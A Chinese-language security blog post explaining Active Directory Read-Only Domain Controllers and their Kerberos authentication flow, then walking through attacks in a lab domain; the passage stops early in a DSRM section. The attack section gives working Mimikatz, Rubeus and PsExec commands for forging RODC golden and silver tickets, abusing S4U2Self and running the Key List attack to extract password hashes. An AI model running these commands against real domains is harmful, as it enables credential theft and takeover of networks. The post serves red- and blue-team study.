---
title: Revisiting a Abuse of Read-Only Domain Controllers (RODCs)
date: 2023-11-27 16:48:00 +0800
author: WHOAMI
toc: true
categories: ["Windows Security"]
tags: ["Windows", "Active Directory", "Kerberos", "RODC"]
layout: post
---

# TL;DR

由于 RODC 通常被视为不具备与可写 DC 相同级别的访问权限，因此在许多环境中，可能会牵涉到利用 RODC 提升权限的情况。在某些情景下，有可能从只读域控制器升级为完全可写的域控制器。

本文涵盖了 Active Directory 环境中使用只读域控制器时可能发生的错误配置情况，并使红队和蓝队更好地了解和检查 RODC 配置是否存在问题。

# Read-Only Domain Controller

只读域控制器（Read-Only Domain Controller，RODC）是 Windows Server 操作系统中的一种新型域控制器。通过 RODC，组织可以在无法保证物理安全性的地方轻松部署域控制器。RODC 托管 Active Directory 域服务（AD DS）数据库的只读分区。

在 Windows Server 2008 发布之前，如果用户必须通过广域网络（WAN）与域控制器进行身份验证，那么实际上并没有真正的替代方案。在许多情况下，这不是一种高效的解决方案。分支办公室通常无法提供可写域控制器所需的足够物理安全性。此外，分支办公室在连接到中心站点时通常具有较差的网络带宽。这可能增加登录所需的时间，并妨碍访问网络资源。

## New Functionality RODCs Provide

RODC 解决了分支机构中常见的一些问题。这些位置可能没有域控制器。或者，他们可能拥有可写域控制器，但没有物理安全、网络带宽或本地专业知识来支持它。以下 RODC 功能可以缓解这些问题：

- Read-only AD DS database：只读 AD DS 数据库
- Unidirectional replication：单向复制
- Credential caching：凭证缓存
- Administrator role separation：管理员角色分离
- Read-only Domain Name System (DNS)：只读域名系统（DNS）

### Read-only AD DS Database

除了帐户密码之外，只读域控制器（RODC）保存了可写域控制器持有的所有 Active Directory 对象和属性。然而，在存储在 RODC 上的数据库上不能进行更改。必须在可写域控制器上进行更改，然后将更改复制回 RODC。

请求对 RODC 目录进行读取访问的本地应用程序可以获得访问权限。请求写访问权限的 LDAP 应用程序会收到 LDAP 引用响应。此响应将它们定向到可写域控制器（通常位于中心站点）。

### RODC Filtered Attribute Set

某些使用 AD DS 作为数据存储的应用程序可能具有类似凭据的数据（例如密码、凭据或加密密钥），但通常不希望将这些数据存储在 RODC 上，以防 RODC 受到威胁。

对于这些类型的应用程序，可以在架构中为不会复制到 RODC 的域对象动态配置一组属性。这组属性称为 RODC 过滤属性集（RODC Filtered Attribute Set）。不允许将 RODC 筛选属性集中定义的属性复制到林中的任何 RODC。

您无法将系统关键属性添加到 RODC 筛选属性集中。如果 AD DS 需要某个属性，则该属性是系统关键的。例如，只有存在这些关键属性时，本地安全机构（LSA）、安全帐户管理器（SAM）以及 Microsoft 特定的安全服务提供商接口（SSPI），例如 Kerberos 才能正常运行。系统关键属性的 schemaFlagsEx 属性值等于 1（即，schemaFlagsEx 属性值 & 0x1 **=** TRUE）。

### Unidirectional Replication

由于没有任何更改直接写入 RODC，因此没有任何更改源自 RODC。因此，作为复制伙伴的可写域控制器不必从 RODC 中复制更改。这意味着恶意用户在分支位置进行的任何更改或损坏都无法从 RODC 复制到林的其余部分。

RODC 单向复制适用于 AD DS 和 SYSVOL 的分布式文件系统（DFS）复制。RODC 对 AD DS 和 SYSVOL 更改执行正常的入站复制。

### Credential Caching

凭据缓存是用户或计算机凭据的存储。凭据由一小组大约 10 个与安全主体关联的密码组成。默认情况下，RODC 不存储用户或计算机凭据。除 RODC 的计算机账户和每个 RODC 拥有的特殊 Krbtgt 帐户外，域内其他用户或计算机凭据在 RODC 上默认存储为空。用户需要明确指定允许 RODC 上的任何其他凭据缓存。

RODC 常常作为分支机构的密钥分发中心（KDC）。RODC 使用的 Krbtgt 帐户和密码与可写域控制器上的 KDC 在签署或加密票证授予票证（TGT）请求时使用的 Krbtgt 帐户和密码不同。

当 RODC 提供服务的站点中的用户或计算机尝试向域进行身份验证时，RODC 默认情况下无法验证其凭据。然后，RODC 将身份验证请求转发到可写域控制器。

帐户成功通过身份验证后，RODC 尝试联系中心站点上的可写域控制器并请求相应凭据的副本。可写域控制器识别出该请求来自 RODC，并查阅对该 RODC 有效的密码复制策略。

密码复制策略确定用户的凭据或计算机的凭据是否可以从可写域控制器复制到 RODC。如果密码复制策略允许，可写域控制器会将凭据复制到 RODC，并且 RODC 缓存它们。

将凭据缓存在 RODC 上后，RODC 可以直接为该用户的登录请求提供服务，直到凭据发生更改。当使用 RODC 的 Krbtgt 帐户对 TGT 进行签名时，RODC 会识别出它具有凭据的缓存副本。如果另一个域控制器对 TGT 进行签名，RODC 会将请求转发到可写域控制器。

通过将凭证缓存限制为仅对已通过 RODC 身份验证的用户进行，还可以限制因 RODC 泄露而造成的潜在凭证泄露。通常，只有一小部分域用户的凭据缓存在任何给定的 RODC 上。因此，如果 RODC 被盗，只有缓存的凭证才有可能被破解。

禁用凭据缓存可能会进一步限制暴露，但这会导致所有身份验证请求都转发到可写域控制器。管理员可以修改默认密码复制策略以允许在 RODC 缓存用户的凭据。

### Administrator Role Separation

您可以将 RODC 的本地管理权限委派给任何域用户或组，而无需向该用户或组授予该域或其他域控制器的任何访问权限。被委派的域用户或组具有对 RODC 服务器的本地管理员访问权限。这允许本地分支用户登录到 RODC 并在服务器上执行维护工作，例如升级驱动程序。但是，分支用户无法登录到任何其他域控制器或在域中执行任何其他管理任务。通过这种方式，分支用户可以被委派有效管理分支办公室中的 RODC 的能力，而不会影响域其余部分的安全。

### Read-only DNS

您可以在 RODC 上安装 DNS 服务器服务。RODC 能够复制 DNS 使用的所有应用程序目录分区，包括 ForestDNSZones 和 DomainDNSZones。如果 DNS 服务器安装在 RODC 上，则客户端可以像查询任何其他 DNS 服务器一样查询它的名称解析。

但是，RODC 上的 DNS 服务器是只读的，因此不支持直接客户端更新。

## Kerberos Service Accounts

每个 Active Directory 域都有一个名为 Krbtgt 的 Kerberos 服务帐户，用于签署所有 Kerberos 票证并加密所有 TGT。由于 Krbtgt 帐户的密码哈希（Long-term Key）用于对域的 Kerberos 票证进行签名/加密，因此如果攻击者了解 Krbtgt 密码哈希，则可能会导致他们创建黄金票据来欺骗访问 AD 域内的任何资源。

每个 RODC 都有自己特定的 Krbtgt 帐户，该帐户特定于该 RODC 并且与写域控制器的 Krbtgt 帐户隔离。RODC Kerberos 帐户遵循命名格式 “Krbtgt_xxxxx”，其中 xxxxx 是密钥版本号。密钥版本号还存储在新 Krbtgt 帐户的 msDS-SecondaryKrbTgtNumber 属性中。

Krbtgt 帐户的 DN 名称存储在 RODC 计算机对象的 msDS-KrbTgtLink 属性中，RODC 计算机对象的 DN 名称存储在 Krbtgt 帐户的 msDS-KrbTgtLinkBl 属性中。这两个属性用于 RODCs 与其 Krbtgt 账户的关联/链接。如下图所示。

![image-20231122155153818](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231122155153818.png)

每当 RODC 签发 TGT 时，它都会在票证的 kvno 字段中指定其 Krbtgt 的密钥版本号（也就是 msDS-SecondaryKrbTgtNumber 属性的值），以指示使用哪个密钥来加密和签署票证。

![image-20231127012841676](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231127012841676.png)

RODC 生成的 TGT 可以在 TGS-REQ 中使用，以从同一 RODC 或可写域控制器获取服务票证。当 RODC 生成的 TGT 提供给可写域控制器时，仅当票证是为 RODC 的 msDS-RevealOnDemandGroup 属性中列出的主体生成且未在 RODC 的 msDS-NeverRevealGroup 属性中列出时，域控制器才会接受它。

## Password Replication Policy (PRP)

RODC 的 Krbtgt 帐户仅用于签署/加密已缓存并存储在 RODC 中的帐户的 Kerberos 票证。任何由客户端提供给 可写域控制器的 RODC 生成的 Kerberos 身份验证票证（TGT）都不被信任。

默认情况下，在 RODC 上不缓存账户密码。然而，为了使有些账户能够通过 RODC 进行身份验证（例如，当与 DC 的网络连接中断时），需要在 RODC 上缓存这些帐户的凭据。管理员通常会将这些用户添加到某个组中，然后将该组添加到域的 “*Allowed RODC Password Replication Group*” 组中。或者，将该组添加到 RODC 上的密码复制策略并设置为允许来实现，如下图所示

![image-20231122220114771](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231122220114771.png)

上图中显示了 RODC 上 Password Replication Policy 的默认配置：

- Account Operators: 拒绝
- Administrators: 拒绝
- Allowed RODC Password Replication Policy: 允许
- Backup Operators: 拒绝
- Denied RODC Password Replication Policy: 拒绝
- Server Operators: 拒绝

此外，有一些账户或组被添加到 “*Denied RODC Password Replication Group*” 组中，明确拒绝将其帐户密码复制到 RODC，这可以防止这些组中的帐户密码被保存在 RODC 上，默认情况下包含以下账户或组。需要注意的是，“拒绝” 的优先级总比 “允许” 要高。

- Cert Publishers
- Domain Admins
- Domain Controllers
- Enterprise Admins
- Group Policy Creator Owners
- Krbtgt
- Read-only Domain Controllers（RODC 的计算机帐户密码存储在其本地）
- Schema Admins

PRP 由两个包含安全主体（用户、计算机和组）的多值 Active Directory 属性定义。每个  RODC 计算机帐户都具有这两个属性：

- msDS-RevealOnDemandGroup，也被称为 “Allowed List”，允许列表，包含允许列表的成员 DN。
- msDS-NeverRevealGroup，也被称为 “Denied List”，拒绝列表，包含拒绝列表的成员 DN。

此外，为了帮助管理 PRP，为每个 RODC 维护与 PRP 相关的另外两个多值属性：

- msDS-RevealedList，也称为 “Revealed List”，已揭示列表，包含密码曾被复制到 RODC 的安全主体的 DN。
- msDS-AuthenticatedToAccountList，也被称为 “Authenticated to List”，已验证到列表，包含已经过身份验证的安全主体的 DN。

msDS-RevealOnDemandGroup 属性指定了哪些安全主体的密码可以在RODC上被缓存。默认情况下，此属性只有一个值，即 “Allowed RODC Password Replication Group”。由于此域本地组默认情况下没有成员，因此默认情况下在任何 RODC 上都不能缓存任何帐户密码。

允许缓存凭据的用户和计算机帐户列表并不意味着 RODC 必定已经缓存了这些帐户的密码。这些帐户被视为 “可缓存的”，如果管理员除了设置 PRP 之外不采取进一步的操作，这些用户将只有在首次针对 RODC 登录后其密码才会被缓存。然而，管理员还可以在任何身份验证请求之前让 RODC 提前缓存任何帐户。这样，即使与中心站点的广域网（WAN）链路离线，RODC 也可以对这些帐户进行身份验证。您可以使用 `repadmin /rodcpwdrepl` 命令提前缓存密码。

## RODC's Manage

域控制器本身没有本地帐户和本地组。当一个服务器提升为域控制器时， Active Directory 会替换本地帐户和组，这同样适用于 RODC。但是，由于 RODC 往往部署在不受信任的网络位置，允许零级（Tier Zero）管理员，例如域管理员去管理 RODC 会暴露太大的风险。

因此，企业或组织中的管理员可以将 RODC 的本地管理权限委派给任何域用户或组，而无需向该用户或组授予该域或其他域控制器的任何访问权限，如下图所示。被委派的域用户或组具有对 RODC 服务器的本地管理员访问权限。

![image-20231122223300532](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231122223300532.png)

RODC 的管理委派由 RODC 的 ManagedBy 属性控制，该属性标识被委派去管理 RODC 的用户或组，如下图所示：

![image-20231122223737566](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231122223737566.png)

# How the Authentication Process Works On an RODCs

下面我们介绍使用 RODC 进行身份验证时身份验证过程的工作原理。描述了计算机帐户向域进行身份验证、用户登录到域以及用户尝试通过 RODC 访问资源的过程。

本节描述的过程讨论的场景如下：

- 假设本节描述的帐户、资源和对象都位于单个 Active Directory 域中。
- 一个名为 Marcus Holloway 的域用户拥有一个名为 Marcus 的用户帐户。
- Marcus 的工作站名为 MHCOMPUTER。
- MHCOMPUTER 位于 AD DS 中的一个名为 Office 的站点中。
- RODC 是该域的只读域控制器，也是 Office 中唯一的域控制器。
- 密码复制策略允许将 MHCOMPUTER 和 Marcus 的密码缓存到 RODC 上。
- MHCOMPUTER 和 Marcus 的帐户密码尚未缓存在 RODC上。
- DC01 是一台可写的域控制器，运行的是 Windows Server 2008 或更高版本。
- DC01 位于 AD DS 中一个名为 Core 的站点中。

## Computer Account Authentication Using an RODC

域成员计算机必须对域进行身份验证。当计算机帐户位于由 RODC 提供服务的站点中时，它们尝试通过 RODC 进行身份验证。下文中描述了当 MHCOMPUTER 首次对域进行身份验证以请求票证授予票证（TGT）时发生的过程。由于 RODC 被宣称为该站点的 Kerberos 密钥分发中心（KDC），MHCOMPUTER 使用 RODC 作为KDC。

当 MHCOMPUTER 对域进行身份验证时，将发生以下流程：

1. MHCOMPUTER 准备了一个 Kerberos 身份验证服务请求（KRB_AS_REQ），并将其发送到 Office 站点中的RODC。

2. RODC 收到来自 MHCOMPUTER 的 KRB_AS_REQ 后，将检查其本地数据库以查看 MHCOMPUTER 的帐户密码是否被缓存。由于密码未被缓存，RODC 无法对 MHCOMPUTER 进行身份验证。

3. RODC 将来自 MHCOMPUTER 的 KRB_AS_REQ 转发到 Core 站点中的可写域控制器，本场景中为名为 DC01 的服务器。

4. DC01 收到 KRB_AS_REQ 请求并能够使用其完整的 Active Directory 数据库对 MHCOMPUTER 进行身份验证。

5. DC01 为 MHCOMPUTER 生成一个 Kerberos 身份验证服务响应（KRB_AS_REP），并将其发送给 RODC。

6. 之后，RODC 执行以下两个操作：

   a. 请求 DC01 将 MHCOMPUTER 的凭据复制到其 Active Directory 数据库的副本中。

   b. 将 KRB_AS_REP 响应转发给 MHCOMPUTER。

7. DC01 检查密码复制策略并确定 MHCOMPUTER 被允许在 RODC 上缓存其帐户密码。

8. MHCOMPUTER 的凭据被复制到 RODC，并将 MHCOMPUTER 添加到 “*Accounts whose passwords are stored on this Read-only Domain Controller*” 的列表中（也就是 msDS-RevealedList 属性值）。

9. RODC 缓存了 MHCOMPUTER 的帐户密码。

## Initial User Logon Process Using an RODC

当 Marcus 使用 MHCOMPUTER 登录域时，必须从域控制器检索 TGT，然后获取一个允许 Marcus 使用 MHCOMPUTER 的服务票证。TGT 检索过程以及获取服务票证的过程如下所示。

**TGT 检索过程：**

1. Marcus 尝试登录并使用 MHCOMPUTER 。

2. 因为 RODC 被宣称为 Office 站点的 KDC，MHCOMPUTER 准备票证授予票证（TGT）请求（KRB_AS_REQ）并将其发送到 RODC。

3. RODC 收到来自 MHCOMPUTER 的 KRB_AS_REQ 请求。RODC 检查其本地数据库，发现并没有 Marcus 的帐户密码存储在本地，因此无法对 Marcus 进行身份验证。

4. RODC 将 KRB_AS_REQ 转发到 Core 站点中的可写域控制器 DC01。

5. DC01 收到 KRB_AS_REQ 请求，并且能够使用其完整的 Active Directory 数据库对Marcus进行身份验证。

6. DC01 使用域标准 Krbtgt 帐户签署一个 TGT，并将 KRB_AS_REP 响应发送到 RODC。

7. 然后，RODC 执行以下两个操作：

   a. 请求 DC01 将 Marcus 的凭据复制到其 Active Directory 数据库的副本中。

   b. 将 Marcus 的 KRB_AS_REP 响应转发给 MHCOMPUTER。

8. DC01 检查密码复制策略并确定 Marcus 被允许在 RODC 上缓存其帐户密码。

9. Marcus 的凭据被复制到 RODC，并将 Marcus 添加到 “*Accounts whose passwords are stored on this Read-only Domain Controller*” 的列表中。

10. RODC 缓存了 Marcus 的帐户密码。

在此过程结束时，MHCOMPUTER 和 Marcus 帐户都具有使用域密钥签名的 TGT，并且这两个帐户都在 RODC 上缓存了凭据。然而，在 Marcus 可以使用 MHCOMPUTER 之前，他还需获取一个服务票证，如下所示。

**服务票获取：**

1. MHCOMPUTER 向 Office 站点的 RODC 发送了一份为 Marcus 请求 TGS 的 Kerberos 请求（KRB_TGS_REQ），同时附带了由 DC01 签发的 TGT。
2. 由于 RODC 不知道可写域控制器用于加密 TGT 的 Krbtgt 帐户的密码，无法解密 TGT。因此，RODC 将 KRB_TGS_REQ 请求转发到位于 Core 站点的可写域控制器 DC01。
3. DC01 接收并解密了 KRB_TGS_REQ，并用 KRB_TGS_REP 响应回复 RODC。
4. 由于 RODC 已经缓存了 MHCOMPUTER 的凭据，它能够满足对服务票证的请求。因此，在从 DC01 收到 KRB_TGS_REP 响应后，RODC 向 MHCOMPUTER 返回一个错误消息（KDC_ERR_TGT_REVOKED），而不是一个服务票证。
5. MHCOMPUTER 在从 RODC 收到错误消息后丢弃了之前由 DC01 签发的 TGT。然后，MHCOMPUTER 向 RODC 发送了另一个 KRB_AS_REQ。
6. RODC 收到 KRB_AS_REQ 请求。由于 Marcus 的凭据已经被缓存，RODC 使用自己的 Krbtgt 帐户来加密TGT。
7. 然后，RODC 向 MHCOMPUTER 发送了带有新 TGT 的 KRB_AS_REP 响应。
8. MHCOMPUTER 向 RODC 发送了另一个 KRB_TGS_REQ（包括由 RODC 签发的新 TGT）。
9. RODC 收到 KRB_TGS_REQ 并能够解密 TGT。由于 MHCOMPUTER 的凭据已经在本地缓存，RODC 生成并发送了一个带有服务票证的 KRB_TGS_REP 给 MHCOMPUTER，以供 Marcus 使用。

在这个过程结束时，Marcus 已经登录到了 MHCOMPUTER，并且具有由 RODC 签发的用于使用 MHCOMPUTER 的服务票证。Marcus 和 MHCOMPUTER 的帐户凭据都被缓存在 RODC 上。DC01 记录下它向 RODC 提供了 MHCOMPUTER 和 Marcus 的凭据。

## Subsequent User Logons After Credentials Are Cached on The RODC

在 RODC 上缓存了用户帐户的凭据和用户登录的工作站的凭据之后，RODC 可以处理登录请求而无需联系可写域控制器。允许使用 RODC 进行认证以允许 Marcus 随后访问 MHCOMPUTER 的过程如下所示。

1. Marcus 尝试登录并使用 MHCOMPUTER 。
2. 由于 RODC 被宣称为 Office 站点的 KDC，MHCOMPUTER 向 RODC 发送了一个 KRB_AS_REQ 请求。
3. RODC 收到了来自 MHCOMPUTER 的 KRB_AS_REQ，并且能够使用其本地的 Active Directory 数据库对 Marcus 进行身份验证，因为 Marcus 和 MHCOMPUTER 的凭据已经在本地缓存。
4. RODC 创建了 KRB_AS_REP 响应，其中包含使用 RODC 的 Krbtgt 帐户签名的 TGT，并将其发送到 MHCOMPUTER。
5. MHCOMPUTER 将 TGT 存储在与 Marcus 的登录会话相关联的票证缓存中。然后，MHCOMPUTER 为 Marcus 准备了一个 KRB_TGS_REQ 请求并将其发送到 RODC。
6. RODC 能够解密来自 MHCOMPUTER 的 KRB_TGS_REQ 中的 TGT，因为 TGT 是由 RODC 上的 Krbtgt 帐户加密的。由于 MHCOMPUTER 的凭据已经在本地存储，RODC 创建了一个 KRB_TGS_REP 相应，其中包括服务票证。
7. RODC 将 KRB_TGS_REP 发送到 MHCOMPUTER，在那里它被存储在与 Marcus 的登录相关联的票证缓存中。

Marcus 的登录会话现在缓存了一个由 RODC 提供的 TGT 和服务票证，允许他使用 MHCOMPUTER。Marcus 现在可以开始在 MHCOMPUTER 上工作。

> **要使 RODC 在本地验证登录请求，必须本地缓存用户和计算机凭据。如果用户的凭据被缓存，但计算机凭据未被缓存，RODC 将无法为用户提供登录到计算机所需的服务票证。如果此时网络中断，阻止 RODC 与运行 Windows Server 2008 或更高版本的可写域控制器联系，RODC 将无法为计算机帐户提供服务票证，用户的登录将失败。**

## Resource Access Using Authentication By an RODC

当 Marcus 需要访问位于另一个站点的服务器上的资源时，他的帐户需要一个服务票证，以允许访问该服务器。Marcus 获取用于访问 Core 站点中名为 FILESERVER 的服务器的服务票证的过程如下所示。

1. Marcus 试图通过在 Office 站点使用 MHCOMPUTER 访问位于 Core 站点中的 FILESERVER 上的资源。
2. MHCOMPUTER 向 RODC 发送了一个用于 FILESERVER 的 KRB_TGS_REQ 请求。
3. RODC 能够读取 KRB_TGS_REQ 中的 TGT，但它在本地没有缓存 FILESERVER 的凭据。因此，它将请求转发到可写域控制器 DC01。
4. DC01 能够解密由 RODC 创建的TGT。然而，由于可写域控制器不信任由 RODC 发出的 TGT，DC01 重新计算了权限属性证书（PAC）。
5. DC01 向 RODC 发送了一个包含 FILESERVER 服务票证中重新计算的 PAC 的 KRB_TGS_REP 响应。
6. RODC 将 KRB_TGS_REP 相应转发给了 MHCOMPUTER。
7. MHCOMPUTER 现在能够连接到 FILESERVER，以允许 Marcus 访问他的帐户已被授予访问权限的资源。

FILESERVER 的凭据没有被缓存在 RODC 上，但 Marcus 可以访问他的帐户在 FILESERVER 上被授予访问权限的资源。

# Attack with RODCs

## Golden Tickets (Restricted)

当攻击者接管了 RODC 主机后，可以通过转储 RODC 上的 NTDS.dit 提取部分域凭据，例如 RODC 的 Krbtgt 账户（这里是 krbtgt_17748）。攻击者可以用这个 krbtgt_17748 账户，通过 Mimikatz 工具伪造 Golden Tickets，用于后续对 RODC 的持久性访问。

（1）执行以下命令，用 krbtgt_17748 的哈希伪造 Golden Tickets：

```powershell
mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1076904399-1612789786-3660608273 /krbtgt:74379bc566c6ab7ccdfbb7388f303cef /ticket:golden.kirbi" exit
```

![image-20231123125048048](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123125048048.png)

（2）执行以下命令，将伪造的 Golden Tickets 提交到内存中：

```powershell
mimikatz.exe "kerberos::purge" "kerberos::ptt golden.kirbi" exit
```

![image-20231123125412751](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123125412751.png)

（3）但是，将伪造的 Golden Tickets 传递到 RODC 时却提示 “拒绝访问”，如下图所示。

![image-20231123134730757](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123134730757.png)

我们使用 WireShark 抓包，监控票据传递时的流量，如下图所示。

![image-20231123141329725](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123141329725.png)

可以看到，在收到 KRB_TGS_REQ 请求后，RODC 上的 KDC 抛出了 KRB_AP_ERR_BAD_INTEGRITY 错误。这是因为我们在伪造 TGT 时，默认使用的密钥版本号（Kvno）为 2，RODC 会尝试用标准域 Krbtgt 账户的 Long-term Key 解密 TGT。但由于标准域 Krbtgt 账户的凭据不会存储在 RODC 上，因此 KDC 无法解密 TGT 的加密字段。

因此，我们需要在伪造  Golden Tickets 时指定密钥版本号（Kvno）为 17748，RODC 将使用自身的 krbtgt_17748 账户凭据解密 TGT。

Mimikatz 的提供了 `/rodc` 选项，允许我们指定 Kvno，如下所示。

```powershell
mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1076904399-1612789786-3660608273 /krbtgt:74379bc566c6ab7ccdfbb7388f303cef /rodc:17748 /ticket:golden.kirbi" exit
```

![image-20231123142327265](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123142327265.png)

传递该票据，可以成功访问并控制 RODC，如下所示。

![image-20231123142554958](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123142554958.png)

值得注意的是，由于标准域 Krbtgt 账户与 RODC 自身 Krbtgt 账户的隔离，使用 RODC 的 Krbtgt 并不是真正意义上伪造出 Golden Tickets。因为它必须传递到 RODC 作为 KDC 进行身份验证的工作站或站点中，并且目标工作站的计算机账户必须将其凭据存储在 RODC 上，否则它将无法工作。

## Silver Tickets

如果攻击者可以转储 RODC 上的 NTDS.dit，并且能够提取到计算机账户的哈希时，就可以用这个哈希值，通过 Mimikatz 工具伪造 Silver Tickets 来接管这台计算机（这里是 WIN-IISSERVER）。

（1）执行以下命令，用 WIN-IISSERVER 的哈希伪造其 CIFS 和 HOST 服务的 Silver Tickets 并提交到内存中：

```powershell
# 伪造 CIFS 服务票据
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-1076904399-1612789786-3660608273 /target:WIN-IISSERVER.corp.local /rc4:db5c5213ddf59e59f7f625ce2910fc71 /service:cifs /user:Administrator /ptt" exit

# 伪造 HOST 服务票据
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-1076904399-1612789786-3660608273 /target:WIN-IISSERVER.corp.local /rc4:db5c5213ddf59e59f7f625ce2910fc71 /service:host /user:Administrator /ptt" exit
```

![image-20231123151932994](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123151932994.png)

（2）此时，可以使用 PsExec 获取 WIN-IISSERVER 服务器控制权限：

```powershell
PsExec.exe \\win-iisserver.corp.local -i -s cmd
```

![image-20231123152011499](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123152011499.png)

## S4U2Self

除了伪造 Silver Tickets 以外，在获取计算机账户的凭据后，还可以通过滥用 S4U2Self 来获得对该主机的控制权限。这里我们通过。项目进行演示。

（1）首先使用 WIN-IISSERVER 的哈希为其请求 TGT：

```
Rubeus.exe asktgt /user:WIN-IISSERVER$ /rc4:db5c5213ddf59e59f7f625ce2910fc71
```

![image-20231123161118184](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123161118184.png)

（2）通过 Kerberos 的 S4U2Self 扩展协议，使用已获取到的 TGT 申请针对 WIN-IISSERVER 上 CIFS 服务的特权 ST 票据并提交到内存中，如下所示。

```
 Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:CIFS/WIN-IISSERVER /dc:rodc.corp.local /ticket:<Base64EncodedTicket> /ptt
```

![image-20231123161905514](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123161905514.png)

（3）最后可以通过缓存的服务票据成功访问 WIN-IISSERVER 上 CIFS 服务，如下所示。

![image-20231123162028886](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123162028886.png)

## Key List Attack

Leandro Cuozzo ([@0xdeaddood](https://twitter.com/0xdeaddood)) 在他的文章 “[*The Kerberos Key List Attack: The return of the Read Only Domain Controllers*](https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/)” 中介绍了针对 RODC 的密钥列表攻击（Key List Attack）。其中涉及微软 “[MS-KILE: Kerberos Protocol Extensions](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a32282e-dd48-4ad9-a542-609804b02cc9)” 文档中记录的 Key List 请求：

> “*When a Key Distribution Center (KDC) receives a TGS-REQ message for the krbtgt service name (sname) containing a KERB-KEY-LIST-REQ [161] (section 3.1.5.1) padata type **the KDC SHOULD include the long-term secrets of the client** for the requested encryption types in the KERB-KEY-LIST-REP [162] response message and insert it into the encrypted-pa-data of the EncKDCRepPart structure, as defined in [RFC6806] .*”

KERB-KEY-LIST-REQ 结构用于请求 KDC 可以提供给客户端的密钥类型列表，以支持旧协议中的单点登录功能。其结构是使用 ASN.1 表示法定义的。语法如下：

```c++
KERB-KEY-LIST-REQ ::= SEQUENCE OF Int32 -- encryption type --
```

KERB-KEY-LIST-REP 结构包含 KDC 提供给客户端的密钥类型列表，以支持旧协议中的单点登录功能。其结构语法如下：

```c++
KERB-KEY-LIST-REP ::= SEQUENCE OF EncryptionKey
```

密钥列表攻击涉及伪造 RODC 黄金票据，然后使用它向“KRBTGT”服务的可写域控制器发送 TGS-REQ。TGS-REQ 包含“密钥列表请求”(KERB-KEY-LIST-REQ)。如果目标帐户位于 RODC 的*msDS-RevealOnDemandGroup*属性中，而不位于 RODC 的*msDS-NeverRevealGroup*属性中，则 TGS-REP 将包含带有用户凭据的 KERB-KEY-LIST-REP 结构。

当密钥分发中心（KDC）收到包含 KERB-KEY-LIST-REQ padata 类型的 KRB_TGS-REQ 消息时，KDC 会在 KRB_TGS-REP 响应消息中的 KERB-KEY-LIST-REP 结构中包含客户端的凭据，并将其插入到 EncKDCRepPart 结构的加密 pa-data 中。

我们可以配合 Golden Tickets，利用上述原理获取目标账户的哈希值。前提是，目标帐户位于 RODC 的 msDS-RevealOnDemandGroup 属性中，但不位于 RODC 的 msDS-NeverRevealGroup 属性中。

我们可以借助 Rubeus 工具完成上述攻击。

（1）首先使用 Rubeus 为 CorpAdmin 用户伪造一个 Golden Tickets，其中 rodcNumber 代表 RODC 中 Krbtgt 账户的密钥版本号，rc4 为 RODC 中 Krbtgt 账户的哈希值，id 为要伪造的用户 RID，最后还需要域名和域 SID 的值。

```powershell
Rubeus.exe golden /rodcNumber:17748 /rc4:74379bc566c6ab7ccdfbb7388f303cef /user:CorpAdmin /id:1117 /domain:corp.local /sid:S-1-5-21-1076904399-1612789786-3660608273
```

![image-20231123170608076](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123170608076.png)

（2）然后使用这个伪造的票据向可写域控的 krbtgt 服务发起 KRB_TGS_REQ 请求，KRB_TGS_REQ 消息中包含 KERB-KEY-LIST-REQ 结构的 Key List Request，用于请求 KDC 可以提供给客户端的密钥类型列表。

```powershell
Rubeus.exe asktgs /enctype:rc4 /keyList /service:krbtgt/corp.local /dc:dc01.corp.local /ticket:<Base64EncodedTicket>
```

![image-20231123170948274](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123170948274.png)

最终可以获得 CorpAdmin 用户的哈希值。

需要注意的是，Administrator 等特权用户或组位于 msDS-NeverRevealGroup 属性中，被明确拒绝向 RODC 复制凭据。因此，默认配置下，我们无法通过上述攻击获取受保护的特权用户，也就是属于零级（Tier Zero）用户的哈希值。

## DSRM PTH to DCSync

Directory Services Restore Mode（DSRM）指目录服务还原模式，是 Active Directory 域控制器上的安全模式启动选项，用于使服务器脱机以进行紧急维护。在初期安装 Windows 域服务时，安装向导会提示用户设置 DSRM 的管理员密码。有了该密码后，网络管理员可以在后期域控发生问题时修复、还原或重建活动目录数据库。

在域控制器上，DSRM 账户实际上就是本地管理员账户（Administrator），并且该账户的密码在创建后几乎很少使用。通过在域控上运行 NTDSUtil 可以为 DSRM 账户修改密码。

